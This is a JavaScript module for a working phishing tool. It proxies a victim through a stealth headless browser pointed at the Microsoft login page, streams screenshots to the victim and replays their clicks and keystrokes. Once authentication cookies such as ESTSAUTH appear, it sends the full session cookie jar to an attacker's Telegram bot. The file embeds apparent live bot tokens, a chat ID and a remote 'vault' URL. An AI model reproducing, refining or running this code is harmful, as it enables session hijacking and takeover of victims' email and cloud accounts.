const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

// --- CONFIGURATION ---
const VAULT_URL = "https://script.googleusercontent.com/macros/echo?user_content_key=AWDtjMUqhClgfeFlU8Xv_oX6N6eXj3l7lbyNcSkwxk-JkstXJYafiVNpdDBlT452ND7spqv7p3eQRXoD5LOsTDGcSZA1g4RX8v7GLHXuLucT81tg9au9CEbNP55X9hLIOqMSQh8Fc-taJut7HXkZiFO464jKxJCrfrUaLuqfE4rZyHPFdaXwlPY9wZwfTHjcYK33eMIoLp_eyKW2KspfnYAk2Xx6dbBVNjIOCTUS9di8QeEHoSra82-uqH8Wrl5yHTXorlXRxsCYZa4-wO_EOwajrh3mg7KUNQ&lib=MycdviQl2tpQGpak5QfXFV5l1jq1QWbX2";
const TARGET = "https://login.microsoftonline.com/";

async function getCredentials() {
    try {
        const response = await axios.get(VAULT_URL, { timeout: 7000, maxRedirects: 5 });
        if (response.data && response.data.TG_TOKEN) return response.data;
    } catch (e) {
        console.log("[VAULT] Using fallback credentials.");
    }
    return { 
        "TG_TOKEN": "8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc",
        "TG_CHAT_ID": "1318100118"
    };
}

async function sendExfiltration(cookies, url) {
    const creds = await getCredentials();
    const host = new URL(url).hostname;

    console.log(`[SYSTEM] Exfiltrating Finalized Jar for: ${host} (${cookies.length} cookies)`);

    try {
        // Notification
        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
            chat_id: creds.TG_CHAT_ID,
            text: `<b>🚨 FULL SESSION CAPTURED</b>\n<b>User:</b> ${host}\n<b>Integrity:</b> High (Finalized)`,
            parse_mode: 'HTML'
        });

        // File
        const form = new FormData();
        form.append('chat_id', creds.TG_CHAT_ID);
        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
            filename: `FULL_SESSION_${host.replace(/\./g, '_')}.json`,
            contentType: 'application/json'
        });

        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
        
        console.log("[SYSTEM] Telegram delivery successful.");
    } catch (e) {
        console.log("[ERROR] Telegram API failed. Check Bot Permissions.");
    }
}

async function startSession(io, socket) {
    let browser = null;
    const captured = new Set();

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-features=IsolateOrigins,site-per-process']
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

        await page.goto(TARGET, { waitUntil: 'networkidle2' });

        // THE MATURITY POLLER
        const poller = setInterval(async () => {
            try {
                const url = page.url();
                const cookies = await page.cookies();

                // 1. Check for the "Holy Grail" cookies
                const hasMasterAuth = cookies.some(c => 
                    c.name.includes('ESTSAUTH') || 
                    c.name.includes('RPSSecAuth') || 
                    c.name.includes('MSAAUTHP')
                );

                // 2. Only trigger if we are on a post-login page
                const isFinalPage = url.includes('outlook') || url.includes('mail') || url.includes('portal') || url.includes('dashboard');

                if (hasMasterAuth && isFinalPage && !captured.has(url)) {
                    captured.add(url);
                    console.log("[POLLER] Critical tokens detected. Waiting for maturity...");

                    // Wait 4 seconds for the final redirects and background encryption keys to settle
                    setTimeout(async () => {
                        const matureJar = await page.cookies();
                        await sendExfiltration(matureJar, url);
                    }, 4000);
                }
            } catch (e) {}
        }, 5000);

        // STREAMING
        const stream = setInterval(async () => {
            if (socket.connected) {
                try {
                    const b64 = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 25 });
                    socket.emit('browser-render', { screenshot: b64 });
                } catch (e) {}
            }
        }, 1000);

        // ACTIONS
        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.move(data.x, data.y);
                    await page.mouse.click(data.x, data.y, { delay: 50 });
                } else if (data.type === 'key') {
                    await page.keyboard.press(data.key);
                }
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(poller);
            clearInterval(stream);
            if (browser) await browser.close();
        });

    } catch (err) {
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
